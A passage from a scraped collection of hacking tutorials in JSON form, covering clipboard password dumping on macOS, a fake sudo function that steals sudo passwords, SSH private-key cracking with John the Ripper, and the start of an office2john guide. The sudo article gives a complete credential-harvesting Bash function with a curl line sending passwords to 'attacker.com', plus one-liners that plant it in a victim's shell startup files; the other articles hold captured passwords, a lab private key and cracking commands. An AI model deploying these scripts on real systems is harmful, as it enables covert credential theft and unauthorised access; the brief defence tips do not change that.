Server started at Sun Jun  9 08:38:55 2019\nListening on http://0.0.0.0:80\nDocument root is /root/phpServer\nPress Ctrl-C to quit.\n[Sun Jun  9 09:03:23 2019] 23.129.64.153:63761 [200]: /\n[Sun Jun  9 09:03:33 2019] 23.129.64.153:46089 [200]: /\n[Sun Jun  9 09:03:50 2019] 23.129.64.184:13728 [200]: /\n[Sun Jun  9 09:03:56 2019] 199.195.250.77:38894 [200]: /\n[Sun Jun  9 09:04:02 2019] 199.195.250.77:40646 [200]: /\n[Sun Jun  9 09:04:10 2019] 209.141.58.114:45602 [200]: /\nView the clipboard.txt contents with cat to find the encoded passwords. KeePassX and 1Password automatically clear the clipboard after ten and thirty seconds, respectively. LastPass states it clears the clipboard \"after a default amount of time.\" Empty deliveries from the MacBook appear as \"Cg==\" encoded.\n~/phpServer# cat clipboard.txt\nWVQ0bjNNNHNDcGpwc1RWN0xrWm9LCg==\ndGhpcyBpcyBteSBwYXNzd29yZAo=\nUHdVN1YzWzg3a3ZUPyNed01QKF9jVHltNj8iPjoifTp7Kl5gYH4K\nWVQ0bjNNNHNDcGpwc1RWN0xrWm9LCg==\nWVQ0bjNNNHNDcGpwc1RWN0xrWm9LCg==\nThe following command will automatically decode all of the base64 strings in the clipboard.txt file. All of the below strings are passwords captured while using KeePassX, 1Password, and LastPass.\n~/phpServer# cat clipboard.txt | while read -r password; do base64 -d <<< \"$password\"; done\nYT4n3M4sCpjpsTV7LkZoK\nthis is my password\nPwU7V3[87kvT?#^wMP(_cTym6?\">:\"}:{*^``~\nYT4n3M4sCpjpsTV7LkZoK\nYT4n3M4sCpjpsTV7LkZoK\nLive Off the Land (Conclusion)\nPenetration testers are encouraged to utilize as many resources already present in the compromised operating system (i.e., \"living off the land\"). Like cURL, Netcat, Bash, and LibreSSL, pbpaste is yet another built-in tool easily abused by a hacker during post-exploitation engagements.\nAttackers will explore every avenue to discover a target's login passwords. Pbpaste makes dumping credentials stored in password managers almost too easy.\nHow to Protect Yourself from Clipboard Dumping\nTo prevent an attacker from having an opportunity to dump the clipboard, install the official 1Password browser extension or LastPass browser extension. They are available for all modern web browsers. For KeePassX users, similar browser extensions exist, but none have been officially audited or tested.\nFor 1Password, once the extension is installed, enable the \"1Password Extension Helper\" when prompted. Then, the helper would allow 1Password to autofill credentials while logging into websites. Autofill does not use the clipboard at all, therefore preventing a clipboard attack. The process is similar for the LastPass extension.\nKeep in mind that neither work 100% of the time. Sometimes, it's necessary to copy passwords to the clipboard when autofill on a website does not work.\nIf you must copy a password, you can adjust the clipboard settings for the password manager. For instance, you can go open 1Password's preferences, select \"Security,\" then enter a time in seconds by \"Clear clipboard contents after.\" Make it as short as can be. In the hacks above, we used five-second intervals, so three or four seconds may be useful, but that doesn't mean a hacker won't be able to grab a password if it checks the clipboard at the right moment or if the time interval is decreased.\nOverall, there is no built-in way to clear the clipboard on macOS after a set amount of time or as soon as an item is pasted, nor would it be advisable since the clipboard is used for more than just passwords.\nYou could build a Service for \"Clear Clipboard\" and assign it a keyboard shortcut like Command + Down Arrow. Then, you can manually clear the clipboard after pasting a password, so it's not sitting in there longer than necessary. Just build the Service with Automator, but use the following as the \"Run Shell Script.\" However, you'd run into the same problem as described above about the clipboard being exfiltrated at the right moment or with a smaller interval before checks.\npbcopy </dev/null\nIf you enjoyed this article, follow me on Twitter @tokyoneon_. For questions and concerns, leave a comment or message me on Twitter.",
        "category": "Password Cracking"
    },
    {
        "title": "Steal Ubuntu & MacOS Sudo Passwords Without Any Cracking",
        "link": "https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/",
        "content": "* WonderHowTo\nWith a simple social engineering trick, sudo passwords can be captured in seconds without the target's knowledge. The passwords can then be saved to a file or exfiltrated to another computer on the network.\nAfter exploiting a system, penetration tester's and hackers will often begin privilege escalation (privesc) attacks. Such attacks include kernel exploitation and password phishing. The featured attack here takes a social engineering approach by utilizing Bash functions to emulate the functionality of the sudo command.\nHow Sudo Is Supposed to Work\nLet's use the following whoami and id commands as an example. If we enter whoami into a terminal, it will return the current username.\nWith the id command, it will return the user's uid (-u), a unique identifier assigned to each user on the system. By default, in Debian and Ubuntu systems, a normal user (non-root user) is assigned the uid of 1000 (shown below). Similarly, in macOS, a normal user is assigned the 501 uid.\nWhen prepended, sudo elevates and executes the provided command with root (uid 0) privileges. This is all standard and normal behavior for sudo and Unix systems.\n~$ sudo id -u\nThe type command can be used to identify how the supplied command is interpreted by the shell.\n~$ type sudo\nsudo is /usr/bin/sudo\nIn this case, sudo is interpreted as /usr/bin/sudo. This is also standard behavior. When someone executes the sudo command (e.g., sudo whoami), they're essentially doing the following.\n~$ /usr/bin/sudo /usr/bin/whoami\nRecommended Book on Amazon: Sudo Mastery: User Access Control for Real People\nHow Bash Functions Work\nThe way sudo (or any command for that matter) is interpreted can be modified in such a way that's transparent to the user. Much like Bash aliases, complex functions can be imported into the shell. Take the below GIF as an example.\nWe can see running an ordinary apt-get update command fails because \"sudo\" is no longer interpreted as a direct link to the real sudo binary. It's now a function that prints some arbitrary text. This can very easily be abused. The \"sudo\" function can behave exactly like the real sudo, while recording and exfiltrating the target's password.\nYou Should Already Have Remote Access\nThis article assumes remote access to the target system has been established. With macOS targets, this can be accomplished with an undetectable payload, USB drop attack, or USB Rubber Ducky. Ubuntu and Debian servers are also exploitable using various SSH and server-based vulnerabilities.\nStep 1: Create a Malicious Bash Function\nThis kind of abuse is better demonstrated in the below function. Comments have been added in green to explain the importance of each line.\nfunction sudo () {\n# A \"realsudo\" variable is created. It calls the `which` command to locate\n# the path to the real sudo binary. This is used later in the function to\n# execute the target's desired command.\nrealsudo=\"$(which sudo)\"\n# The `read` command will prompt (`-p`) the target with a convincing password\n# request. The `-s` argument hides the input password, just as the real\n# sudo command would. The target password is then set in the \"inputPasswd\"\n# variable.\nread -s -p \"[sudo] password for $USER: \" inputPasswd\n# There are two `printf` commands here, separated by a semicolon.\n# The first simply prints a new line in the terminal, as the real sudo\n# does. The second writes the target's username and password to a\n# file called \"hackedPasswd.txt\" in the /tmp directory.\nprintf \"\\n\"; printf '%s\\n' \"$USER : $inputPasswd\" >/tmp/hackedPasswd.txt\n# As an alternative to writing the password to the /tmp directory,\n# it can be exfiltrated to the attacker's server. Uncomment the below\n# \"encoded\" and \"curl\" lines to enable this function. The password\n# is encoded with `base64` to make it easier to transmit in the URL.\n# encoded=$(printf '%s' \"$inputPasswd\" | base64) >/dev/null 2>&1\n# curl -s \"http://attacker.com/$USER:$encoded\" >/dev/null 2>&1\n# The `-S` option allows users to input their sudo password using the command\n# line. This is used to run an arbitrary `exit` command (`-c`) as the root\n# user (`-u`) to unlock the sudo timeout function. This command and its\n# output are hidden (/dev/null) from the target. It's only here to allow\n# sudo usage for future commands.\n# For more on sudo timeouts and /dev/null, see:\n# https://itsfoss.com/change-sudo-password-timeout-ubuntu/\n# https://stackoverflow.com/questions/10508843/what-is-dev-null-21\n$realsudo -S <<< \"$inputPasswd\" -u root bash -c \"exit\" >/dev/null 2>&1\n# With the sudo timeout engaged, privileged commands can be run without\n# prompting the user for a password. This line will execute the target's\n# desired command.\n$realsudo \"${@:1}\"\nLet's have a look at how this function appears to the target.\nAs we can see, the target is still prompted with a password request when trying to install software. A closer look with type reveals the malicious function. The captured password is saved to the /tmp/hackedPasswd.txt file.\nOption 1: Target Debian & Ubuntu Systems\nWith Debian and Ubuntu systems, when a new terminal or shell is opened, the ~/.bashrc file is executed. This file (which can be modified by non-root users) usually defines useful attributes like aliases, history limit, and color variables. It can also be abused to import malicious Bash functions. This is true for Debian servers, Ubuntu desktops, and macOS systems.\nFor convenience, I've uploaded the malicious sudo function to my GitHub page. It can be downloaded onto the target's system using the below command.\n~$ curl 'https://git.io/fhNWm' >> ~/.bashrc\nThis will append (>>) the sudo function to the bottom of the target's .bashrc file. From here on, when the target logs into their server (e.g., SSH) and executes a sudo command, the submitted password will be saved to the /tmp directory. Alternatively, if curl isn't installed on the target system, wget can be used.\n~$ wget -O- 'https://git.io/fhNWm' >> ~/.bashrc\nOption 2: Target macOS Systems\nThis kind of attack is less effective against macOS users. Simply because they're not as likely to open a terminal and execute elevated commands. MacOS users don't need the sudo command as often as VPS targets or Ubuntu desktop users. Still, I'll show how to set this up against a macOS target as it might be helpful to some penetration testers exploring every possible route to elevate their backdoor.\nLike the ~/.bashrc, macOS systems execute the ~/.bash__profile file when Terminal is opened. Malicious Bash functions can be stored in this file. Use the below wget command to import the function into the target's Bash profile.\n~$ wget -O- 'https://git.io/fhNWm' >> ~/.bash_profile\nWhen the target opens Terminal and executes a sudo command, the password will be stored in the /tmp directory. This is illustrated in the below screenshot.\n* Don't Miss: The Ultimate Guide to Hacking Computers Running macOS\nStep 2: Exfiltrate the Password (Optional)\nIn addition to saving the password to the /tmp directory, it might be desirable to have the password sent to another computer or server. A proper PHP listener could be set up to gracefully intercept POST data containing the password.\nI decided to take a slightly unorthodox approach and feature a quick and dirty solution. This method requires a simple Python3 server set up on the attacker's Kali system. The http.server module (-m) will create a web server using port 80.\n~$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 ...\nThere are commands for encoding and exfiltrating passwords written into the sudo function. It's disabled by default and needs to be uncommented to enable it.\nencoded=$(printf '%s' \"$inputPasswd\" | base64) > /dev/null 2>&1;\ncurl -s \"http://attacker.com/$USER:$encoded\" > /dev/null 2>&1;\nThe password is encoded with base64 to make it easier to send in the URL. Curl is used to silently (-s) make a GET request on the attacker's server located at the \"attacker.com\" domain. This domain should be changed to the attacker's local IP address (192.168.1.X) or VPS IP address. Errors and output generated by the curl command are forced into /dev/null with the 2>&1 redirect. This prevents curl from accidentally reporting errors in the terminal if the attacker's server is for some reason inaccessible.\nThe target's username and password are actually sent in the URL. Imagine making a request to \"http://192.168.1.X/tokyoneon:sUp3R-S3cUre_P@$$w0000rD!.\" The request would surely fail, there's no such webpage. However, the encoded password would be stored in the attacker's error log. Below is an example of such an error.\nServing HTTP on 0.0.0.0 port 80 ...\n127.0.0.1 - - [27/Feb/2019 00:05:12] code 404, message File not found\n127.0.0.1 - - [27/Feb/2019 00:05:12] \"GET /user:c1VwM1ItUzNjVXJlX1BAJCR3MDAwMHJEIQ== HTTP/1.1\" 404 -\nSimply echo the encoded password into base64 to decode (-d) it.\n~$ echo 'c1VwM1ItUzNjVXJlX1BAJCR3MDAwMHJEIQ==' | base64 -d\nsUp3R-S3cUre_P@$$w0000rD!\nHow to Protect Against Bash Function Abuse\nMalicious Bash functions can be difficult to detect. If there's an attacker on your system modifying the ~/.bashrc or ~/.bash_profile file, you might have bigger issues to worry about.\nAs we learned earlier, the type command is an extremely useful tool. It can be used to print the provided commands shell interpretation. Commands like sudo should only call the appropriate binary or will sometimes appear as \"hashed\" in the session. All other conditions should be investigated.\n~$ type sudo\nsudo is /usr/bin/sudo\nIt's also a good idea to manually inspect the ~/.bashrc file. Hacker's will often use this file to embed persistent backdoors into Unix systems (e.g., attempt a new Netcat connection every time a terminal is opened). This can be done with nano or vim.\n~$ nano ~/.bashrc\nFinal Thoughts\nThis kind of social engineering attack has many applications. For example, similar functions can be created for ssh and other remote administration protocols. It would be possible for an attacker to steal SSH credentials and pivot to other systems within the target's control. Likewise, a malicious function for the su command can be created. This command, like sudo, is designed to elevate user privileges and can be easily mimicked using simple Bash functions.\nIf you enjoyed this article, follow me on Twitter @tokyoneon_ and GitHub to keep up with my current projects. For questions and concerns, leave a comment below or message me on Twitter.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo by Arian Darvishi/Unsplash; Screenshots by tokyoneon/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Crack SSH Private Key Passwords with John the Ripper",
        "link": "https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/",
        "content": "* WonderHowTo\nSecure Shell is one of the most common network protocols, typically used to manage remote machines through an encrypted connection. However, SSH is prone to password brute-forcing. Key-based authentication is much more secure, and private keys can even be encrypted for additional security. But even that isn't bulletproof since SSH private key passwords can be cracked using John the Ripper.\nSSH Key-Based Authentication\nThe standard way of connecting to a machine via SSH uses password-based authentication. This has the advantage of being easier to set up but suffers security-wise due to being prone to brute-forcing and password guessing.\nKey-based authentication, on the other hand, uses cryptography to ensure secure connections. A key pair is generated consisting of a public and private key. The private key should be kept secret and is used to connect to machines that have the matching public key.\n* Don't Miss: Intercept & Decrypt Windows Passwords on a Local Network\nThe public key is used to encrypt communication that only the associated private key can decrypt. This makes it nearly impossible for hackers to compromise SSH sessions unless they have access to the private key.\nThe below steps assume you have already gained access to a target computer from your local machine. I'm using Kali Linux as the local box.\nStep 1: Create a New User on the Target\nTo begin, let's create a new user on the target for demonstration purposes. Use the adduser command, and enter a new password at the prompt:\ntarget:~$ sudo adduser nullbyte\nAdding user `nullbyte' ...\nAdding new group `nullbyte' (1003) ...\nAdding new user `nullbyte' (1003) with group `nullbyte' ...\nCreating home directory `/home/nullbyte' ...\nCopying files from `/etc/skel' ...\nEnter new UNIX password:\nRetype new UNIX password:\npasswd: password updated successfully\nNext, verify the information is correct. It's OK to just leave everything blank:\nChanging the user information for nullbyte\nEnter the new value, or press ENTER for the default\nFull Name []:\nRoom Number []:\nWork Phone []:\nHome Phone []:\nIs the information correct? [y/N] y\nWe can verify the new user was added successfully by viewing /etc/passwd:\ntarget:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\ndhcp:x:101:102::/nonexistent:/bin/false\nsyslog:x:102:103::/home/syslog:/bin/false\nklog:x:103:104::/home/klog:/bin/false\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nbind:x:105:113::/var/cache/bind:/bin/false\npostfix:x:106:115::/var/spool/postfix:/bin/false\nftp:x:107:65534::/home/ftp:/bin/false\npostgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nmysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false\ntomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false\ndistccd:x:111:65534::/:/bin/false\nuser:x:1001:1001:just a user,111,,:/home/user:/bin/bash\nservice:x:1002:1002:,,,:/home/service:/bin/bash\ntelnetd:x:112:120::/nonexistent:/bin/false\nproftpd:x:113:65534::/var/run/proftpd:/bin/false\nstatd:x:114:65534::/var/lib/nfs:/bin/false\nnullbyte:x:1003:1003:,,,:/home/nullbyte:/bin/bash\nNow we can switch to our new user with the su command:\ntarget:~$ su - nullbyte\nnullbyte@target:~$\nStep 2: Generate a Key Pair on the Target\nThe next thing we need to do is generate a public/private key pair. The ssh-keygen utility can easily take care of this for us. Use the default location, which will create the file in our home directory:\nnullbyte@target:~$ ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/nullbyte/.ssh/id_rsa):\nCreated directory '/home/nullbyte/.ssh'.\nWe want our private key to be encrypted, so make sure to enter a password at the prompt (we'll use the password abc123 just to keep it simple):\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/nullbyte/.ssh/id_rsa.\nYour public key has been saved in /home/nullbyte/.ssh/id_rsa.pub.\nThe key fingerprint is:\n1b:01:68:cc:ea:4f:8e:b5:08:72:17:50:32:1b:98:e6 nullbyte@target\nNow we can change into the hidden SSH directory:\nnullbyte@target:~$ cd .ssh/\nAnd verify our keys are there:\nnullbyte@target:~/.ssh$ ls -la\ndrwx------ 2 nullbyte nullbyte 4096 2019-06-19 13:49 .\ndrwxr-xr-x 3 nullbyte nullbyte 4096 2019-06-19 13:46 ..\n-rw------- 1 nullbyte nullbyte 1743 2019-06-19 13:49 id_rsa\n-rw-r--r-- 1 nullbyte nullbyte  405 2019-06-19 13:49 id_rsa.pub\nWe'll also need to create an authorized_keys file to make sure we're allowed to connect from our other machine:\nnullbyte@target:~/.ssh$ touch authorized_keys\nSet the appropriate permissions on it to ensure only our user can read and write the file:\nnullbyte@target:~/.ssh$ chmod 600 authorized_keys\nThe public key needs to go in this file, so cat it out:\nnullbyte@target:~/.ssh$ cat id_rsa.pub\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7IATfm6Y2VDtlEkWNGLJ5r9z9euOD1mHcWeB4vCcY+9M+XTEkILb8gk0/0uaNrLfBgcrZi8Y15wIib8122KYfwVIxVn0kbp5sggo4ZZQ9AXAPsdXyP8iIhCdbu34QkEu+pdq1jjK2QKbJRhRt4woAKGXxpApGfWdbyDdElo001VjjmDIpUwKU695YlF98baOlxgUdtW+zhL8J2W6cABeQEO3pXaiu560mJxSfRX8J++5djHiwJ9LMQAVD8khrvYfmnExeT1CuhNcbxdD/kU64ccV0zhecUQgXR1zEY/tWVdJL8wWfUnHWza2BiYqCeEhIdKGlVLvPUx5LbihLUFdCw== nullbyte@target\nAnd copy it into the authorized_keys file, making sure there are no line breaks or extra spaces:\nnullbyte@target:~/.ssh$ nano authorized_keys\nStep 3: Get the Private Key on the Local Machine\nAt this point, we need to get the private key (id_rsa) on our local machine. This can happen through a variety of scenarios, like if we had read access due to LFI or even command injection allowing us to execute certain commands.\nFor demonstration purposes, we'll just transfer it over via HTTP. It's always a good idea to check which, if any, version of Python is installed:\nnullbyte@target:~/.ssh$ which python\n/usr/bin/python\nWe can spin up a quick HTTP server with the following command:\nnullbyte@target:~/.ssh$ python -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\nOn our local machine, we can use wget to grab the file:\n~# wget http://10.10.0.50:8000/id_rsa\n--2020-04-15 12:19:39--  http://10.10.0.50:8000/id_rsa\nConnecting to 10.10.0.50:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1743 (1.7K) [application/octet-stream]\nSaving to: ‘id_rsa’\nid_rsa                                    100%[=====================================================================================>]   1.70K  --.-KB/s    in 0.001s\n2020-04-15 12:19:49 (2.18 MB/s) - ‘id_rsa’ saved [1743/1743]\nAnd verify its contents:\n~# cat id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: DES-EDE3-CBC,9A447029ABFAC605\nWiRuWyOFt8x+eCwBIbRdhpa8pm1YIuBIC1Od73vslxlIcYYkSz8AqCr8k/sus6uY\nJHHO6KXjkJCpH/okU9bWGPzQf1cj2jWFf/y7EOSmd1e7RbIA8xWYcAWKPhnvwgnu\nz+d6SFSYyj4rkKUvqloclKCblp6M5sCza0YksTzmEJZz/tHWRwHGRG31TvJHiqxQ\nn9FpriG5MqZoegcYJgvt+z9rrPNf/jaZZb9ulYwxRn+5nCbWqBilu/Mh5knN608c\nuW2UyIlyJ2BpyYrOgqadTkMgIwrwERrbU6LmgVtZXCc6/cACdMwdu6gv17MtfOlM\nytzEZ66aa98EFrFfuFX2LgoOBpi4nAAo3yZ7ISWpWnbnPFzhT89gBAdruh8fo5X4\n07gAajsTiJrCW2nZSqBFx4BTAqYP7IcvDv2iAUEg6bfqC2bqpIfjYYcLuy0+YQv4\n7uNH9jpT+ZfOY6VK4oG1p+1ieOVothNxcoj0+StUL5i5dQYoW9te8z8+qqswAE9S\naobSSQAUvdNh07XH0TXg+QTsiJGLNMaWmwMBw50WkzJOwN759zuk2b1LbHTpsgbQ\nAngfcMfoHOvlhnHZNSbCeDB9SzQwkhLnQ6CktQaQaa5AY/E2ll+/W0Dmr4QEhk7e\nz30FE3QqZU7fqxx7esXTMm8z6lvhQNSWRRxsg48rHub+Mq739T+Yi7xK4C9SCzwe\n7BYDqp2ekinCf+5OKf3UObNo5Cugb3viapDKHyWulH+dXdxSkLUsgzDoFdFz0H3m\nwvc8Qfn0JoVWFxwd1J3B32ZcEIneeGyotrODz5bRmqLv/T7mdM/HRASdonTROEPn\nG+Mv65R+MRiAhRIIZO3a8J8eSAzq3AVBuq+gbLabnNvGY2N7KSQ3OBV4XSDYS43R\nHuRz2u1GI+sXOr7ZXoQeKbl9qoymRvpppf5kI5IrQBoHGF92GGVLBGJOBg9M/YNc\nmLNm9lz2Y+9LmHU6lgq51a7ZfViVFvj+Us63DoSgdyHvC2oj2zWPOFf9Dm4r8aCO\nbFS2BFb7UvBd/G2GxnYFKygTHZhPmZ2y/5fBBF5IA/rbQdE5SqC2MJmB0oOgB07v\ncsqQ5tX8guIxOnh/KHocR/B8Fwf90shrOWoVC0kqGZJN5PrepzPCvoMcJLknC0Q8\neUinaZ0r3UCv7z0gjlz66qWERIMlUczBnLALRf4nVkfP3NHrLinZooGnOh7pkXpm\nmg2qTXWnJ+vwfEDb4M0DYOFKa/AxO2wWsCuvc7ZJYvZL2HSWNVl6fRcFTWbrbIr/\najTfjIclAonNYgGxoDAQKtSSolrNdOquemW79evgdAN/Jtbp5irV3bG0hTcJSIPp\nkVBSXe3pslX6BUeOPl9KFT9CNxIjNFZkJ/gUxIV9LOIEcmHCB04iGVFl/KQA2FWD\n27fOZbQPG/h4XC6Zm2iGU7ub0FNA2rId1ZRXlE04gYu5g/nmnAOlSbcqcN+xoMmh\nL31FphscezkNda/Fw70+y/5buYGSs4tMsUKuiTkZsqSW9j3R9I/7KLHbpKX7fI7n\nOURnUxXvDLoXihVQ9kTgTJM6d8pbHYuda4po2IvXWqdnbtHP7Ezz4A==\n-----END RSA PRIVATE KEY-----\nStep 4: Install SSH2John on the Local Machine\nUnless the jumbo version of John the Ripper is installed, we'll need to download ssh2john from GitHub since it's not included in the John the Ripper version that's installed in Kali Linux. (If you don't have John the Ripper installed, you can find out how to install it from its GitHub.)\n~# wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py\n--2020-06-07 12:26:03--  https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.28.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.28.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 7825 (7.6K) [text/plain]\nSaving to: ‘ssh2john.py’\nssh2john.py                               100%[=====================================================================================>]   7.64K  --.-KB/s    in 0s\n2020-06-07 12:26:04 (21.2 MB/s) - ‘ssh2john.py’ saved [7825/7825]\nStep 5: Crack the Private Key on the Local Machine\nAll we have to do is run it against the private key and direct the results to a new hash file using the ssh2john Python tool:\n~# python ssh2john.py id_rsa > id_rsa.hash\nNext, we'll use John to crack the password. But first, we need a suitable wordlist; we'll use a short one that already contains our password to keep it simple. Get it from here:\n~# wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt\n--2020-06-07 12:30:54--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.28.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.28.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 81 [text/plain]\nSaving to: ‘darkweb2017-top10.txt’\ndarkweb2017-top10.txt                     100%[=====================================================================================>]      81  --.-KB/s    in 0s\n2020-06-07 12:30:55 (2.28 MB/s) - ‘darkweb2017-top10.txt’ saved [81/81]\nNow run John like usual, feeding it the wordlist and the hash file:\n~# john --wordlist=darkweb2017-top10.txt id_rsa.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes\nCost 2 (iteration count) is 2 for all loaded hashes\nWill run 4 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\nabc123           (id_rsa)\n1g 0:00:00:00 DONE (2020-06-07 12:32) 1.562g/s 15.62p/s 15.62c/s 15.62C/s 123456..123123\nSession completed\nWe can see it identified our password, but just to be sure, let's use the --show command to verify:\n~# john --show id_rsa.hash\nid_rsa:abc123\n1 password hash cracked, 0 left\nStep 6: SSH into the Target\nWe can SSH into the target using the -i option to specify a private key for authentication:\n~# ssh -i id_rsa nullbyte@10.10.0.50\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nPermissions 0644 for 'id_rsa' are too open.\nIt is required that your private key files are NOT accessible by others.\nThis private key will be ignored.\nLoad key \"id_rsa\": bad permissions\nnullbyte@10.10.0.50's password:\nAnd we get an error. It won't allow us to use the key if permissions are too open, so all we have to do is set the permissions to be more restricted:\n~# chmod 400 id_rsa\nNow we are able to connect. Next, enter the cracked password at the prompt and we're in:\n~# ssh -i id_rsa nullbyte@10.10.0.50\nEnter passphrase for key 'id_rsa':\nLinux 2.6.24-16-server #1 SMP Tue July 07 13:58:00 UTC 2008 i686\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\nTo access official Ubuntu documentation, please visit:\nhttp://help.ubuntu.com/\nLast login: Fri Jun 19 15:20:16 2020 from 10.10.0.1\nnullbyte@target:~$\nWrapping Up\nIn this tutorial, we learned about SSH key-based authentication and how to crack private key passwords. First, we created a new user on the target system and generated an SSH key pair. Next, we obtained the private key from the target and used ssh2john to extract the hash. Finally, we cracked the private key password and used it to connect to the target.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by stevepb/Pixabay; Screenshots by drd_/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Crack Password-Protected Microsoft Office Files, Including Word Docs & Excel Spreadsheets",
        "link": "https://null-byte.wonderhowto.com/how-to/crack-password-protected-microsoft-office-files-including-word-docs-excel-spreadsheets-0193959/",
        "content": "* WonderHowTo\nMicrosoft Office files can be password-protected in order to prevent tampering and ensure data integrity. But password-protected documents from earlier versions of Office are susceptible to having their hashes extracted with a simple program called office2john. Those extracted hashes can then be cracked using John the Ripper and Hashcat.\nExtracting the hash from a password-protected Microsoft Office file takes only a few seconds with the office2john tool. While the encryption standard across different Office products fluctuated throughout the years, none of them can stand up to office2john's hash-stealing abilities.\nThis tool is written in Python and can be run right from the terminal. As for Office compatibility, it's known to work on any password-protected file from Word, Excel, PowerPoint, OneNote, Project, Access, and Outlook that was created using Office 97, Office 2000, Office XP, Office 2003, Office 2007, Office 2010, and Office 2013, including the Office for Mac versions. It may not work on newer versions of Office, though, we saved a DOCX in Office 2016 that was labeled as Office 2013.\nStep 1: Install Office2John\nTo get started, we'll need to download the tool from GitHub since office2john is not included in the standard version of John the Ripper (which should already be installed in your Kali system). This can easily be accomplished with wget.\n~# wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/office2john.py\n--2019-02-05 14:34:45--  https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/office2john.py\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.148.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.148.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 131690 (129K) [text/plain]\nSaving to: ‘office2john.py’\noffice2john.py                        100%[=======================================================================>] 128.60K  --.-KB/s    in 0.09s\n2019-02-05 14:34:46 (1.45 MB/s) - ‘office2john.py’ saved [131690/131690]\nStep 2: Make Sure Everything's in the Same Directory\nIn order to run office2john with Python, we will need to change into the same directory that it was installed into. For most of you, this will be Home by default (just enter cd), but feel free to create a separate directory.\nNext, we need an appropriate file to test this on. I am using a simple DOCX file named \"dummy.docx\" that I created and password-protected with Word 2007. Download it to follow along. The password is \"password123\" as you'll find out. You can also download documents made with Word 2010 and Word 2016 (that shows up as 2013) to use for more examples. Passwords for those are also \"password123.\"\nStep 3: Extract the Hash with Office2john\nThe first thing we need to do is extract the hash of our password-protected Office file. Run the following command and pipe the output into \"hash.txt\" for later use.\n~# python office2john.py dummy.docx > hash.txt\nTo verify that the hash was extracted successfully, use the cat command. We can see that the hash I saved corresponds to Microsoft Office 2007. Neat.\n~# cat 